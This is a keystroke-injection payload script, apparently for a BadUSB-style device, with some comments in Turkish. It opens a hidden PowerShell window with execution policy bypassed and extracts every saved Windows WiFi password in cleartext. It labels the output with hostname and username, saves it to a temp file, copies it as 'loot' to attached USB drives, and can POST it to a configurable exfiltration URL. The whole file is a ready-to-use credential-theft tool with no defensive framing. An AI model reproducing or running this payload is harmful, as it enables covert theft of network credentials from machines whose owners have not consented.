// ═══════════════════════════════════════════════════════════════════════════
// Payload: win_wifi_passwords.js
// Target:  Windows 10/11
// Time:    ~8 seconds
// Author:  MoMo-Mimic Team
// ═══════════════════════════════════════════════════════════════════════════
// 
// Açıklama: Kayıtlı WiFi şifrelerini çıkarır
// Admin gerektirmez
// 
// ═══════════════════════════════════════════════════════════════════════════

// ┌─────────────────────────────────────────────────────────────────────────┐
// │ CONFIGURATION                                                            │
// └─────────────────────────────────────────────────────────────────────────┘
var EXFIL_URL = "";          // Boş bırakılırsa sadece dosyaya kaydeder
var SAVE_TO_USB = true;      // Mass storage'a kaydet

// ┌─────────────────────────────────────────────────────────────────────────┐
// │ SETTINGS                                                                 │
// └─────────────────────────────────────────────────────────────────────────┘
layout("us");
typingSpeed(0, 0);

// ┌─────────────────────────────────────────────────────────────────────────┐
// │ PHASE 1: INITIALIZATION                                                  │
// └─────────────────────────────────────────────────────────────────────────┘
delay(2000);

// ┌─────────────────────────────────────────────────────────────────────────┐
// │ PHASE 2: OPEN HIDDEN POWERSHELL                                          │
// └─────────────────────────────────────────────────────────────────────────┘
press("GUI-r");
delay(500);
type("powershell -w hidden -ep bypass");
press("ENTER");
delay(1500);

// ┌─────────────────────────────────────────────────────────────────────────┐
// │ PHASE 3: EXTRACT WIFI PASSWORDS                                          │
// └─────────────────────────────────────────────────────────────────────────┘
type("$results = @(); ");
type("(netsh wlan show profiles) | Select-String ':\\s*(.+)$' | ForEach-Object { ");
type("$name = $_.Matches.Groups[1].Value.Trim(); ");
type("$passResult = (netsh wlan show profile name=\\\"$name\\\" key=clear) | Select-String 'Key Content\\s*:\\s*(.+)$'; ");
type("if($passResult){ $pass = $passResult.Matches.Groups[1].Value.Trim() } else { $pass = '[NO PASSWORD]' }; ");
type("$results += [PSCustomObject]@{SSID=$name; Password=$pass} ");
type("}; ");
press("ENTER");
delay(2000);

// ┌─────────────────────────────────────────────────────────────────────────┐
// │ PHASE 4: FORMAT AND SAVE                                                 │
// └─────────────────────────────────────────────────────────────────────────┘
type("$output = \\\"`n========== WIFI PASSWORDS ==========`n\\\"; ");
type("$output += \\\"Hostname: $env:COMPUTERNAME`n\\\"; ");
type("$output += \\\"User: $env:USERNAME`n\\\"; ");
type("$output += \\\"Date: $(Get-Date)`n\\\"; ");
type("$output += \\\"====================================`n`n\\\"; ");
type("$output += ($results | Format-Table -AutoSize | Out-String); ");
press("ENTER");
delay(500);

// Dosyaya kaydet
type("$output | Out-File $env:TEMP\\wifi_dump.txt -Encoding UTF8");
press("ENTER");
delay(1000);

// ┌─────────────────────────────────────────────────────────────────────────┐
// │ PHASE 5: EXFILTRATION                                                    │
// └─────────────────────────────────────────────────────────────────────────┘
if (EXFIL_URL !== "") {
    type("Invoke-WebRequest -Uri '" + EXFIL_URL + "' -Method POST -InFile $env:TEMP\\wifi_dump.txt");
    press("ENTER");
    delay(2000);
}

// USB Mass Storage'a kaydet (eğer aktifse)
if (SAVE_TO_USB) {
    type("Get-WmiObject Win32_LogicalDisk | Where-Object {$_.DriveType -eq 2} | ForEach-Object { ");
    type("Copy-Item $env:TEMP\\wifi_dump.txt ($_.DeviceID + '\\\\loot_wifi_' + $env:COMPUTERNAME + '.txt') -Force }");
    press("ENTER");
    delay(1000);
}

// ┌─────────────────────────────────────────────────────────────────────────┐
// │ PHASE 6: CLEANUP                                                         │
// └─────────────────────────────────────────────────────────────────────────┘
delay(500);
type("exit");
press("ENTER");

// ┌─────────────────────────────────────────────────────────────────────────┐
// │ OUTPUT LOCATION                                                          │
// └─────────────────────────────────────────────────────────────────────────┘
// Temp: %TEMP%\wifi_dump.txt
// USB:  X:\loot_wifi_HOSTNAME.txt (mass storage aktifse)

